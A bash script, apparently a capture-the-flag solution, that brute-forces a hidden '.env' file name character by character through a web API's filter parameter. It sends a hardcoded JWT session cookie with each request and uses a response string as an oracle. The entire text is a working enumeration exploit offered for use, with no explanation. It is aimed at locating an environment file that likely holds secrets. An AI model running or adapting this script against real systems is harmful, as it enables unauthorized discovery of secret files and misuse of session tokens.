#!/bin/bash

# Define the base URL with the placeholder for the alphanumeric characters
base_url="https://snxdqeu2.eu2.ctfio.com/app/api/files?filter=\$.env"

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
search_string="Hidden For Security: 1"
matched_chars=""

for (( i=0; i<${#chars}; i++ )); do
    char="${chars:$i:1}"
    echo -n "."
    # Construct the URL with the current matched characters and the current character
    current_url="${base_url/\$/${char}${matched_chars}}"

    response=$(curl -s -b 'token-for-prod=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozN30.KEGN0oBp_Xvhc_K_0aJW3Uhv2H3B4VrjT3rMsJwWGjA' "$current_url")

    # Check if the response contains the specific string
    if echo "$response" | grep -q "$search_string"; then
        # If found, add the character to matched_chars
        matched_chars="$char$matched_chars"
        printf "\n> $current_url\n"
        # Start the loop again from the first character
        i=-1
    fi
done

echo "Final matched characters: $matched_chars"
